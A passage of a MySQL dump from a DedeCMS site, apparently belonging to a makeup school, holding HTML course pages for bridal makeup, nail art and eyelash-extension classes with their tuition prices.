&nbsp;<span style=\"font-size:20px;\">并且在底妆上，应先将珠光粉底液均匀地涂在全脸，然后再用遮瑕笔在有瑕疵的地方点上，用指腹推开，再用海绵轻拍修饰。最后选用透明质地的蜜粉轻轻拍在全脸上进行定妆。</span><br style=\"margin: 0px auto; padding: 0px; color: rgb(153, 153, 153); font-family: 微软雅黑; font-size: 20px;\" />\r\n<span style=\"font-family: 微软雅黑; font-size: 20px;\">&nbsp; 同时韩式婚纱妆容讲究自然、大方、清新。因此，对于繁多的彩妆步骤，韩式婚纱适合不过。</span><br style=\"margin: 0px auto; padding: 0px; color: rgb(153, 153, 153); font-family: 微软雅黑; font-size: 20px;\" />\r\n<span style=\"font-family: 微软雅黑; font-size: 20px;\">&nbsp; 那么接下来我们就来欣赏下</span><span style=\"margin: 0px auto; padding: 0px; font-family: 微软雅黑; font-size: 20px;\">群丽化妆学校小雪老师彩妆班新学员</span><span style=\"font-family: 微软雅黑; font-size: 20px;\">的考试作品。</span></span><br />\r\n<br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"婚纱彩妆新学员考试作品\" src=\"/uploads/allimg/150517/1-15051G20625R9.jpg\" /><br />\r\n	<br />\r\n	<img alt=\"婚纱彩妆新学员考试作品\" src=\"/uploads/allimg/150517/1-15051G20F1S0.jpg\" /><br />\r\n	<br />\r\n	<img alt=\"婚纱彩妆新学员考试作品\" src=\"/uploads/allimg/150517/1-15051G20I4V6.jpg\" /><br />\r\n	<br />\r\n	<img alt=\"婚纱彩妆新学员考试作品\" src=\"/uploads/allimg/150517/1-15051G20TDM.jpg\" /><br />\r\n	<br />\r\n	&nbsp;</div>\r\n', '', '', '182.151.165.30');
INSERT INTO dede_addonarticle VALUES ('126', '16', '<p style=\"text-align: center\">\r\n	<span style=\"font-size: 36px\">指尖上的艺术画展~</span></p>\r\n<p style=\"text-align: center\">\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150517/1-15051GA12cN.jpg\" style=\"width: 640px; height: 960px\" /><br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150517/1-15051GA15RH.jpg\" style=\"width: 640px; height: 960px\" /><br />\r\n	<br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150517/1-15051GA2514K.jpg\" style=\"width: 640px; height: 931px\" /></p>\r\n', '', '', '182.151.165.30');

-- ----------------------------
-- Table structure for `dede_addonarticle17`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonarticle17`;
CREATE TABLE `dede_addonarticle17` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `kbsj` int(11) NOT NULL DEFAULT '0',
  `quantity` int(11) NOT NULL DEFAULT '0',
  `sy` int(11) NOT NULL DEFAULT '0',
  `price` float NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonarticle17
-- ----------------------------
INSERT INTO dede_addonarticle17 VALUES ('12', '2', '专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课dd程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2dddd', '', '', '127.0.0.1', '1428204600', '20', '10', '5550');
INSERT INTO dede_addonarticle17 VALUES ('92', '12', '<span style=\"color:#ffffff;\"><span style=\"font-family: \'\'; font-size: 14px; line-height: 30px; text-indent: 28px;\"><span style=\"font-size:22px;\"><span style=\"background-color:#ff66cc;\">招生对象</span></span></span></span><span style=\"color: rgb(51, 51, 51); font-family: \'\'; font-size: 14px; line-height: 30px; text-indent: 28px;\">：主要培训对象为有一定基础的化妆师，针对一些发型和妆面不全面的化妆师授课，根据每个学员的具体情况，采取相应的教学措施，以实践为主，有效提高影楼化妆师和时尚造型师的综合技术水平，增强市场竞争力。让您成为一名具备全面综合能力的造型师。</span>', '', '', '125.70.185.81', '2780', '20', '5', '1680');
INSERT INTO dede_addonarticle17 VALUES ('93', '13', '美甲专业班<br />\r\n&nbsp;<br />\r\n学期:30-45天&nbsp;&nbsp;&nbsp;学费:原价：4360元&nbsp;&nbsp;&nbsp;&nbsp;优惠价：2480元<br />\r\n上课时间：周一至周五&nbsp;&nbsp;<br />\r\n&nbsp;<br />\r\n招生对象：美甲爱好者，创业开店人士，有无美甲基础均可学习<br />\r\n教学目的：主要教授现在美甲行业最实用的技术和最时尚的款型，结合市场的实用简单，花式新颖，注重花样技术的实用性。<br />\r\n逐步升级到学习欧美流行的彩色水晶和花式光疗指甲，简单易学，容易掌握；全面学习日韩流行的3D彩绘、3D雕艺，课程内<br />\r\n容打破了传统美甲技术的单一和复杂，提升美甲花样的设计和变化，操作更加简单，款式深受现代女性喜爱。包教包会，从理<br />\r\n论到实际操作全面的美甲技术。同时增加经营管理课程，让学员迅速提高管理能力，美甲店如何选址，美甲店产品渠道选择，<br />\r\n<img alt=\"\" src=\"/uploads/150422/1-1504221646495D.jpg\" /><img alt=\"\" src=\"/uploads/150422/1-150422164G2321.jpg\" /><br />\r\n美甲店的常态管理，美甲店人力资源管理，开卡技巧，奖惩机制，业绩考核等<br />\r\n课程内容：<br />\r\n一、&nbsp;基础护理<br />\r\n1、&nbsp;甲片修形，涂甲油<br />\r\n2、&nbsp;自然甲修饰，常见自然甲疾病注意事项<br />\r\n3、&nbsp;基础工具的认识与使用<br />\r\n4、&nbsp;贴片甲的制作<br />\r\n二、&nbsp;贴片甲制作<br />\r\n1、&nbsp;贴片甲的种类，用途及选择方法<br />\r\n2、&nbsp;贴片甲的制作流程<br />\r\n3、&nbsp;贴片甲的操作演示（全贴，半贴，法式浅贴）<br />\r\n4、&nbsp;贴片甲的卸除<br />\r\n三、&nbsp;彩妆甲的制作<br />\r\n1、&nbsp;色彩及构图的基本原理<br />\r\n2、&nbsp;彩妆甲制作的相关基础知识（甲油勾绘、法式修甲、指甲贴花、彩线运用、镶嵌饰物、悬挂饰物）<br />\r\n四、&nbsp;甲油教程&nbsp;<br />\r\n1、&nbsp;指甲油的认识与选择<br />\r\n2、&nbsp;指甲油的正确涂法<br />\r\n3、&nbsp;指甲的卸除及保养<br />\r\n4、&nbsp;纯色甲油技巧<br />\r\n5、&nbsp;法式甲油技巧&nbsp;<br />\r\n6、&nbsp;渐变甲油技巧<br />\r\n五、&nbsp;手绘甲的制作<br />\r\n1、&nbsp;彩绘基础知识<br />\r\n2、&nbsp;手绘指甲技巧要求<br />\r\n六、&nbsp;单笔彩绘技法练习<br />\r\n1、&nbsp;基本笔法及线条掌握<br />\r\n2、&nbsp;基本图形：彩绘紫荆花绘画技巧，彩绘玫瑰花绘画技巧，彩绘梅花绘画技巧，彩绘桃心绘画技巧，彩绘蝴蝶绘画技巧，彩绘豹纹绘画技巧<br />\r\n3、&nbsp;打底色的技巧、做样版的技巧掌握<br />\r\n七、&nbsp;排笔绘画技巧掌握（韩式立体彩绘）<br />\r\n1、&nbsp;基本笔法的掌握，取色运笔技巧<br />\r\n2、&nbsp;基础花型：立体彩绘梅花画法、立体彩绘紫荆画法、立体彩绘马蹄画法、立体彩绘玫瑰画法、立体彩绘兰花画法、立体彩绘树叶画法、接合叶子，组合图案；<br />\r\n3、&nbsp;排笔组合图案的技巧掌握<br />\r\n4、&nbsp;制作样版的技巧<br />\r\n八、&nbsp;水晶甲常识与制作<br />\r\n1、&nbsp;水晶甲的起源<br />\r\n2、&nbsp;水晶甲的基础知识<br />\r\n3、&nbsp;水晶甲的种类<br />\r\n4、&nbsp;水晶甲专用材料<br />\r\n5、&nbsp;工具的认识及使用方法<br />\r\n6、&nbsp;水晶甲的制作方法<br />\r\n7、&nbsp;水晶甲的造型要求<br />\r\n8、&nbsp;标准工作流程的演示<br />\r\n九、&nbsp;&nbsp;彩色水晶甲制作<br />\r\n&nbsp;&nbsp;演示操作（单色水晶甲、多色水晶甲、单色渐变水晶甲、多色渐变水晶甲）；延长水晶（操作流程，演示操作，注意事项制作要领，注意事项制作要领）；各种水晶甲的卸除（卸除方法，操作流程，演示操作，注意事项，制作要求）<br />\r\n十、&nbsp;日式粉雕技术<br />\r\n韩式粉雕梅花、韩式粉雕紫荆花、韩式粉雕蝴蝶结、韩式粉雕桃心、韩式粉雕玫瑰、韩式3D创意雕花花样、韩式创意幻彩水晶球、3D创意双色玫瑰<br />\r\n十一、可卸凝胶甲（光疗凝胶甲制作）<br />\r\n1、&nbsp;各类凝胶甲材料特性、使用和储存方法<br />\r\n2、&nbsp;光疗甲凝固原理<br />\r\n3、&nbsp;制作材料介绍<br />\r\n4、&nbsp;幻彩凝胶作用<br />\r\n5、&nbsp;真甲凝胶甲<br />\r\n6、&nbsp;法式凝胶甲<br />\r\n7、&nbsp;延长凝胶甲<br />\r\n8、&nbsp;夹心艺术花式甲<br />\r\n9、&nbsp;贴片凝胶甲<br />\r\n十二、创意新娘甲课程<br />\r\n十三、甲油胶教程<br />\r\n甲油胶基本知识<br />\r\n纯色甲油胶技巧&nbsp;<br />\r\n法式甲油胶技巧&nbsp;<br />\r\n仿真大理石花纹<br />\r\n铂金甲制作<br />\r\n十四、琉璃创意甲制作与技法<br />\r\n单色琉璃<br />\r\n幻彩琉璃<br />\r\n饰品镶嵌技术<br />\r\n', '', '', '182.151.165.30', '4360', '25', '3', '2480');
INSERT INTO dede_addonarticle17 VALUES ('94', '14', '<div style=\"margin: 0px 0px 0px 40px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	<img alt=\"\" src=\"/uploads/150422/1-150422154A2C5.jpg\" style=\"width: 589px; height: 800px;\" /><span style=\"color:#000000;\"><strong><span style=\"font-size:10px;\">学时：2-7天（学会为止）&nbsp;&nbsp;学费：原价1280元&nbsp;&nbsp;&nbsp;优惠价：680元</span></strong></span></div>\r\n<div style=\"margin: 0px 0px 0px 40px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	（赠送：嫁接睫毛工具产品一套和烫睫毛工具一套。）<br />\r\n	招生对象：无基础的美睫爱好者，想全面提升的美甲师、美容师、化妆师、自主创业者等。<br />\r\n	课程特点：本课程有无基础均可学习，灵活，可操作性强，市场需求大，成本低，投资回报快，属于实用性很强的课程。<br />\r\n	课程介绍：课程由理论与实操相结合，深入讲解睫毛嫁接的原理与技巧，学员真人实操。<br />\r\n	课程内容：<br />\r\n	1.种植睫毛的市场与分析<br />\r\n	2.烫睫毛的作用、定义、及原理<br />\r\n	3.烫睫毛的基本程序及方法<br />\r\n	4.烫睫毛的注意事项<br />\r\n	5.娃娃烫睫毛技巧与实操<br />\r\n	6.种植睫毛工作流程与客户沟通技巧<br />\r\n	7.嫁接睫毛理论技术<br />\r\n	8.嫁接睫毛眼部操作注意事项<br />\r\n	9.各种眼型分析<br />\r\n	10.不同款式嫁接睫毛分析<br />\r\n	11.睫毛卸除与修复<br />\r\n	12.睫毛增长与后续养护<br />\r\n	13.嫁接睫毛练习与实践</div>\r\n', '', '', '182.151.165.30', '1280', '20', '5', '680');
INSERT INTO dede_addonarticle17 VALUES ('95', '15', '<img alt=\"\" src=\"/uploads/150422/1-150422162249562.jpg\" /><br />\r\n学习目的：利用业余时间，做自己的形象设计师，提高自我化妆技巧<br />\r\n学习内容：<br />\r\n一&nbsp;&nbsp;个人色彩诊断<br />\r\n二&nbsp;&nbsp;化妆品、化妆工具认识及使用<br />\r\n三&nbsp;&nbsp;&nbsp;基础皮肤知识，护肤知识，黑眼圈，眼袋的修护保养技巧<br />\r\n四&nbsp;&nbsp;粉底认识及使用技巧<br />\r\n五&nbsp;&nbsp;眼部的修饰，眼影，眼线，美目贴处理方法<br />\r\n六&nbsp;&nbsp;假睫毛的戴、夹、刷<br />\r\n七&nbsp;&nbsp;眉毛的修饰与画法，各种风格的眉形<br />\r\n八&nbsp;&nbsp;裸妆<br />\r\n九&nbsp;&nbsp;生活日妆，生活晚妆<br />\r\n十&nbsp;&nbsp;小烟熏、大烟熏的画法<br />\r\n十一&nbsp;&nbsp;生活发型<br />\r\n', '', '', '182.151.165.30', '1280', '20', '1', '680');
INSERT INTO dede_addonarticle17 VALUES ('100', '12', '<br />\r\n', '', '', '171.221.133.112', '2780', '20', '3', '1680');
INSERT INTO dede_addonarticle17 VALUES ('101', '15', '<img alt=\"\" src=\"/uploads/150422/1-150422162135350.jpg\" style=\"width: 589px; height: 800px;\" /><br />\r\n学时：15课时&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学费1980元（活动价1480元）<br />\r\n附:(须提前预约）<br />\r\n专业讲师全程一对一教学&nbsp;手把手辅导，针对个人量身打造专属彩妆造型<br />\r\n学习内容：<br />\r\n一&nbsp;&nbsp;个人色彩诊断<br />\r\n二&nbsp;&nbsp;化妆品、化妆工具认识及使用<br />\r\n三&nbsp;&nbsp;&nbsp;基础皮肤知识，护肤知识，黑眼圈，眼袋的修护保养技巧<br />\r\n四&nbsp;&nbsp;粉底认识及使用技巧<br />\r\n五&nbsp;&nbsp;眼部的修饰，眼影，眼线，美目贴处理方法<br />\r\n六&nbsp;&nbsp;假睫毛的戴、夹、刷<br />\r\n七&nbsp;&nbsp;眉毛的修饰与画法，各种风格的眉形<br />\r\n八&nbsp;&nbsp;裸妆<br />\r\n九&nbsp;&nbsp;生活日妆，生活晚妆<br />\r\n十&nbsp;&nbsp;小烟熏、大烟熏的画法<br />\r\n十一&nbsp;&nbsp;生活发型<br />\r\n', '', '', '182.151.165.30', '1980', '15', '3', '1480');
INSERT INTO dede_addonarticle17 VALUES ('102', '12', '<div>\r\n	<span style=\"color: rgb(255, 255, 255); font-family: Arial; font-size: 20px; text-align: center; background-color: rgb(255, 102, 204);\">教学目的</span><span style=\"font-size:16px;\">针对零基础学员，从无基础到形象设计师，课程结合群丽多年的教学经验，根据不同场合环境要求，在短期内迅速提升化妆师的化妆造型理念及人个审美。适用于零基础的化妆爱好者。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:22px;\"><strong><img alt=\"\" src=\"/uploads/150422/150521/1-150521112601395.jpg\" style=\"height: 543px; width: 400px;\" />&nbsp; <img alt=\"\" src=\"/uploads/allimg/150422/1-150422163052W5.jpg\" style=\"height: 543px; width: 400px;\" /></strong></span></div>\r\n<div>\r\n	<span style=\"font-size:22px;\"><strong>&nbsp;&nbsp;</strong></span><strong style=\"font-size: 22px;\"><span style=\"color: rgb(255, 255, 255);\"><span style=\"background-color: rgb(255, 102, 204);\">教学目的</span></span></strong><strong style=\"font-size: 22px;\">：</strong><span style=\"font-size:14px;\"><span style=\"font-family: Arial;\">有无基础学员都可选学，了解化妆的起源与发展，掌握基础化妆理论、认识化妆工具及化妆品种类。</span></span></div>\r\n<span style=\"font-size:14px;\"><span style=\"font-family: Arial;\">&nbsp; 学习各种脸型、眉形、眼型的修饰技巧，五官黄金比例的认识与调整，色彩的掌握与搭配，时尚生活日妆，美妆，日常生活裸妆，职业OL妆，各类晚宴的高压妆容，清新秀丽的日韩欧美时尚新娘妆，以及相关发型的搭配，时尚生活靓装，美妆的相关发型搭配，人物面部矫正妆，专业实用的多种妆面及化妆师专业操作技巧与重点巩固。常用发型教学（如各类倒梳技巧，日常包发，编发，时尚卷发，生活盘发等）</span></span><br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size:22px;\">&nbsp;<strong><span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">就业方向</span></span></strong>：<span style=\"font-size:16px;\">毕业后可从事影楼化妆师，广告公司，婚庆公司，美妆工作室，彩妆专柜等化妆工作.</span></span></div>\r\n', '', '', '171.221.133.112', '3980', '20', '6', '2980');
INSERT INTO dede_addonarticle17 VALUES ('103', '12', '<div>\r\n	<span style=\"font-size: 22px;\">&nbsp;</span><span style=\"color: rgb(255, 255, 255); font-family: Arial; font-size: 20px; text-align: center; background-color: rgb(255, 102, 204);\">教学目的</span><span style=\"font-size: 16px;\">有无基础学员都可选学，让学员了解日韩欧美流行时尚元素.</span><span style=\"font-size: 16px;\">课程以理论和实践相结合，注重学员的实际操作，培养实用性强，复合型高端化妆人才。提升学员的审美意识，领略日韩欧美的化妆精髓，突破传统的中国式化妆模式，培养学员的拓展创意思维，以满足时尚界对优秀形象设计师的需求。&nbsp;</span></div>\r\n<div>\r\n	<span style=\"font-size: 22px;\">&nbsp;</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:22px;\"><strong><img alt=\"\" src=\"/uploads/150521/1-150521112G4E7.jpg\" style=\"height: 543px; width: 400px;\" />&nbsp;<img alt=\"\" src=\"/uploads/150521/1-150521112J33A.jpg\" style=\"height: 543px; width: 400px;\" /> <img alt=\"\" src=\"/uploads/allimg/150422/1-150422164Z1548.jpg\" style=\"height: 543px; width: 400px;\" /></strong></span></div>\r\n<span style=\"font-size:22px;\"><strong>&nbsp; </strong><br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;<br />\r\n&nbsp; <span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">教学要求</span></span>：<span style=\"font-size:16px;\">了解日韩欧美时尚造型的概念以及运用，突出课程的实用性、结合市场需求及流行趋势、教授流行时尚元素妆容与技巧。各种新娘妆妆容设计及白纱、鲜花、饰品搭配技巧、及各种场合的礼服选择与搭配。综合现在的市场彩妆流行趋势，紧跟时尚潮流。让学员能够独立熟练操作自身作品的展示能力。培养出高能力的应用性人才。</span><br />\r\n&nbsp;<br />\r\n&nbsp; <span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">就业方向</span></span>：<span style=\"font-size:16px;\">各大影楼，化妆品公司，婚庆公司，广告公司、模特公司、个人创业工作室的高端人才</span><br />\r\n&nbsp;</span><br />\r\n', '', '', '125.70.185.81', '6980', '20', '7', '5260');
INSERT INTO dede_addonarticle17 VALUES ('104', '12', '<div>\r\n	<span style=\"color: rgb(255, 255, 255); font-family: Arial; font-size: 20px; text-align: center; background-color: rgb(255, 102, 204);\">教学目的</span><span style=\"color:#000000;\"><span style=\"font-size:16px;\"><span style=\"background-color:#ffffff;\">有无基础学员都可选学，让学员了解日韩欧美流行时尚元素。课程以理论和实践相结合，注重学员的实际操作，培养实用性强，复合型高端化妆人才。提升学员的审美意识，领略日韩欧美的化妆精髓，突破传统的中国式化妆模式，培养学员的拓展创意思维，以满足时尚界对优秀形象设计师的需求。</span></span></span></div>\r\n<div>\r\n	<span style=\"font-size: 22px;\">&nbsp;</span><span style=\"font-size:22px;\"><strong><img alt=\"\" src=\"/uploads/150521/1-150521112T5I6.jpg\" style=\"width: 400px; height: 543px;\" /><img alt=\"\" src=\"/uploads/150521/1-1505211129114Y.jpg\" style=\"width: 400px; height: 543px;\" /><img alt=\"\" src=\"/uploads/150521/1-150521112936324.jpg\" style=\"width: 400px; height: 543px;\" /> <img alt=\"\" src=\"/uploads/allimg/150422/1-1504221A109595.jpg\" style=\"width: 400px; height: 543px;\" /></strong></span></div>\r\n<span style=\"font-size:18px;\"><strong>&nbsp; </strong><span style=\"font-size:20px;\"><span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">教学要求</span></span></span>：<span style=\"font-size:16px;\">了解日韩欧美时尚造型的概念以及运用，突出课程的实用性、结合市场需求及流行趋势、教授流行时尚元素妆容与技巧。各种新娘妆妆容设计及白纱、鲜花、饰品搭配技巧、及各种场合的礼服选择与搭配。综合现在的市场彩妆流行趋势，紧跟时尚潮流。让学员能够独立熟练操作自身作品的展示能力。培养出高能力的应用性人才。</span><span style=\"text-align: center;\">&nbsp;</span><br />\r\n<br />\r\n&nbsp;<span style=\"font-size:20px;\"><span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">就业方向</span></span></span>：<span style=\"font-size:16px;\">各大影楼，化妆品公司，婚庆公司，广告公司、模特公司、个人创业工作室的高端人才</span></span><br />\r\n', '', '', '125.70.185.81', '8780', '20', '3', '6160');
INSERT INTO dede_addonarticle17 VALUES ('105', '12', '<div style=\"text-align: center;\">\r\n	<p class=\"p0\" style=\"margin-bottom: 0pt; margin-top: 0pt; text-align: left;\">\r\n		<span style=\"text-align: center; color: rgb(255, 255, 255); font-size: 15pt; font-family: Arial; background: rgb(255, 102, 204);\">教学目的</span><span style=\"text-align: center; font-size: 12pt; font-family: Arial;\">有无基础学员都可选学，让学员了解日韩欧美流行时尚元素。课程以理论和实践相结合，注重学员的实际操作，培养实用性强，符合型高端化妆人才。提成学员的审美意识，领略日韩欧美的化妆精髓，突破传统的中国式化妆模式，培养学员的拓展创意思维，以满足时尚界对优秀形象设计师的要求。</span></p>\r\n	<br />\r\n	<p class=\"p0\" style=\"margin-bottom: 0pt; margin-top: 0pt; text-align: left;\">\r\n		&nbsp;</p>\r\n	<img alt=\"\" src=\"/uploads/allimg/150525/1-15052510332a09.jpg\" style=\"width: 400px; height: 543px;\" /><img alt=\"\" src=\"/uploads/allimg/150525/1-150525103341246.jpg\" style=\"width: 400px; height: 543px;\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150525/1-1505251033551a.jpg\" style=\"width: 400px; height: 543px;\" /><img alt=\"\" src=\"/uploads/allimg/150525/1-15052510340A42.jpg\" style=\"width: 400px; height: 543px;\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150525/1-15052510341Q56.jpg\" style=\"width: 400px; height: 543px;\" /><br />\r\n	<div style=\"text-align: left;\">\r\n		&nbsp;</div>\r\n</div>\r\n<p class=\"p0\" style=\"margin-bottom:0pt; margin-top:0pt; \">\r\n	<span style=\"color: rgb(255, 255, 255); font-size: 15pt; font-family: Arial; background: rgb(255, 102, 204);\"><span style=\"background-color:#ffffff;\">&nbsp; </span>教学要求</span><span style=\"font-size: 9pt; font-family: Arial;\">：</span><span style=\"font-size: 12pt; font-family: Arial;\">了解日韩欧美时尚造型的概念以及运用，突出课程的实用性、结合市场需求及流行趋势、教授流行时尚元素妆容与技巧。各种新娘妆容设计及白纱、捧花、饰品搭配及技巧、及各种场合的礼服选择与搭配。综合现在的市场彩妆流行趋势，紧跟时尚潮流。让学员能够独立熟练操作自身作品的展示能力。培养处高能力的应用型人才。<br />\r\n	&nbsp; &nbsp;</span><span style=\"color:#ffffff;\"><span style=\"font-size:20px;\"><span style=\"background-color:#ff66cc;\">就业方向</span></span></span>：<span style=\"font-size:16px;\">各大影楼，化妆品公司，婚庆公司，广告公司、模特公司、个人创业工作室的高端人才</span></p>\r\n<br />\r\n', '', '', '125.70.185.81', '7180', '20', '3', '6280');
INSERT INTO dede_addonarticle17 VALUES ('106', '13', '美甲创业班<br />\r\n&nbsp;<br />\r\n学期:2个半月&nbsp;&nbsp;&nbsp;学费:原价：7940元&nbsp;&nbsp;&nbsp;&nbsp;优惠价：3980元<br />\r\n上课时间：周一至周五&nbsp;&nbsp;<br />\r\n招生对象：美甲爱好者，创业开店人士，有无美甲基础均可学习<br />\r\n教学目的：主要教授现在美甲行业最实用的技术和最时尚的款型，结合市场的实用简单，花式新颖，注重花样技术的实用性。逐步升级到学习欧美流行的彩色水晶和<br />\r\n花式光疗指甲，简单易学，容易掌握；全面学习日韩流行的3D彩绘、3D雕艺，课程内容打破了传统美甲技术的单一和复杂，提升美甲花样的设计和变化，操作更加<br />\r\n简单，款式深受现代女性喜爱。包教包会，从理论到实际操作全面的美甲技术。同时增加经营管理课程，让学员迅速提高管理能力，美甲店如何选址，美甲店产品渠<br />\r\n道选择，美甲店的常态管理，美甲店人力资源管理，开卡技巧，奖惩机制，业绩考核等<br />\r\n<img alt=\"\" src=\"/uploads/150422/1-1504221GQRb.jpg\" /><br />\r\n<img alt=\"\" src=\"/uploads/150422/1-1504221GU5108.jpg\" style=\"width: 589px; height: 800px;\" /><br />\r\n课程内容：<br />\r\n一、&nbsp;基础护理<br />\r\n1、&nbsp;甲片修形，涂甲油<br />\r\n2、&nbsp;自然甲修饰，常见自然甲疾病注意事项<br />\r\n3、&nbsp;基础工具的认识与使用<br />\r\n4、&nbsp;贴片甲的制作<br />\r\n二、&nbsp;贴片甲制作<br />\r\n1、&nbsp;贴片甲的种类，用途及选择方法<br />\r\n2、&nbsp;贴片甲的制作流程<br />\r\n3、&nbsp;贴片甲的操作演示（全贴，半贴，法式浅贴）<br />\r\n4、&nbsp;贴片甲的卸除<br />\r\n三、&nbsp;彩妆甲的制作<br />\r\n1、&nbsp;色彩及构图的基本原理<br />\r\n2、&nbsp;彩妆甲制作的相关基础知识（甲油勾绘、法式修甲、指甲贴花、彩线运用、镶嵌饰物、悬挂饰物）<br />\r\n四、&nbsp;甲油教程&nbsp;<br />\r\n1、&nbsp;指甲油的认识与选择<br />\r\n2、&nbsp;指甲油的正确涂法<br />\r\n3、&nbsp;指甲的卸除及保养<br />\r\n4、&nbsp;纯色甲油技巧<br />\r\n5、&nbsp;法式甲油技巧&nbsp;<br />\r\n6、&nbsp;渐变甲油技巧<br />\r\n五、&nbsp;手绘甲的制作<br />\r\n1、&nbsp;彩绘基础知识<br />\r\n2、&nbsp;手绘指甲技巧要求<br />\r\n六、&nbsp;单笔彩绘技法练习<br />\r\n1、&nbsp;基本笔法及线条掌握<br />\r\n2、&nbsp;基本图形：彩绘紫荆花绘画技巧，彩绘玫瑰花绘画技巧，彩绘梅花绘画技巧，彩绘桃心绘画技巧，彩绘蝴蝶绘画技巧，彩绘豹纹绘画技巧<br />\r\n3、&nbsp;打底色的技巧、做样版的技巧掌握<br />\r\n七、&nbsp;排笔绘画技巧掌握（韩式立体彩绘）<br />\r\n1、&nbsp;基本笔法的掌握，取色运笔技巧<br />\r\n2、&nbsp;基础花型：立体彩绘梅花画法、立体彩绘紫荆画法、立体彩绘马蹄画法、立体彩绘玫瑰画法、立体彩绘兰花画法、立体彩绘树叶画法、接合叶子，组合图案；<br />\r\n3、&nbsp;排笔组合图案的技巧掌握<br />\r\n4、&nbsp;制作样版的技巧<br />\r\n八、&nbsp;水晶甲常识与制作<br />\r\n1、&nbsp;水晶甲的起源<br />\r\n2、&nbsp;水晶甲的基础知识<br />\r\n3、&nbsp;水晶甲的种类<br />\r\n4、&nbsp;水晶甲专用材料<br />\r\n5、&nbsp;工具的认识及使用方法<br />\r\n6、&nbsp;水晶甲的制作方法<br />\r\n7、&nbsp;水晶甲的造型要求<br />\r\n8、&nbsp;标准工作流程的演示<br />\r\n九、&nbsp;&nbsp;彩色水晶甲制作<br />\r\n&nbsp;&nbsp;演示操作（单色水晶甲、多色水晶甲、单色渐变水晶甲、多色渐变水晶甲）；延长水晶（操作流程，演示操作，注意事项制作要领，注意事项制作要领）；各种水晶甲的卸除（卸除方法，操作流程，演示操作，注意事项，制作要求）<br />\r\n十、&nbsp;日式粉雕技术<br />\r\n韩式粉雕梅花、韩式粉雕紫荆花、韩式粉雕蝴蝶结、韩式粉雕桃心、韩式粉雕玫瑰、韩式3D创意雕花花样、韩式创意幻彩水晶球、3D创意双色玫瑰<br />\r\n十一、可卸凝胶甲（光疗凝胶甲制作）<br />\r\n1、&nbsp;各类凝胶甲材料特性、使用和储存方法<br />\r\n2、&nbsp;光疗甲凝固原理<br />\r\n3、&nbsp;制作材料介绍<br />\r\n4、&nbsp;幻彩凝胶作用<br />\r\n5、&nbsp;真甲凝胶甲<br />\r\n6、&nbsp;法式凝胶甲<br />\r\n7、&nbsp;延长凝胶甲<br />\r\n8、&nbsp;夹心艺术花式甲<br />\r\n9、&nbsp;贴片凝胶甲<br />\r\n十二、创意新娘甲课程<br />\r\n十三、甲油胶教程<br />\r\n甲油胶基本知识<br />\r\n纯色甲油胶技巧&nbsp;<br />\r\n法式甲油胶技巧&nbsp;<br />\r\n仿真大理石花纹<br />\r\n铂金甲制作<br />\r\n双色扎染、多色扎染、双色横向渐变、彩绘3D蝴蝶结、丝袜甲、创艺异形扎染、镂空线形花样、勾花玫瑰、创艺大理石纹、斜角拉花、回形拉花、彩绘空心玫瑰、日系饰品重点镶嵌讲解实操等，以及多种花样组合款式<br />\r\n十四、琉璃创意甲制作与技法<br />\r\n单色琉璃#p#分页标题#e#<br />\r\n幻彩琉璃<br />\r\n饰品镶嵌技术<br />\r\n韩式水印贴花<br />\r\n进口日系亮片镶嵌技法<br />\r\n创意金铂技法<br />\r\n十五、美甲店经营管理课程<br />\r\n', '', '', '171.221.134.122', '7940', '20', '8', '3980');
